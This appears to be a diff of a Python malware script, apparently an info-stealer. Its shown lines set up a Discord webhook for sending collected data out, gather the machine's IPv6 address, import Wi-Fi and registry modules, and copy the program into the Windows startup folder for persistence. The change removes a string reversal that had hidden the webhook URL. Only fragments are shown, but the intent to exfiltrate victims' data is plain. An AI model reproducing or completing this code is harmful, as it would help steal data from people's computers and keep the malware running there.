@@ -31,7 +31,6 @@ import winreg as wrg
 import pywifi
 
 
-
 webhookurl=''#URL will go here
 userhome = os.path.expanduser('~')
 folderdir=os.path.join(userhome,'Data')
@@ -56,7 +55,7 @@ def copy_to_startup():
     except PermissionError as e:
         pass  
 
-webhook = DiscordWebhook(url=webhookurl[::-1])#Set up webhook
+webhook = DiscordWebhook(url=webhookurl)#Set up webhook
 
 def ip6():#get ipv6
     try:
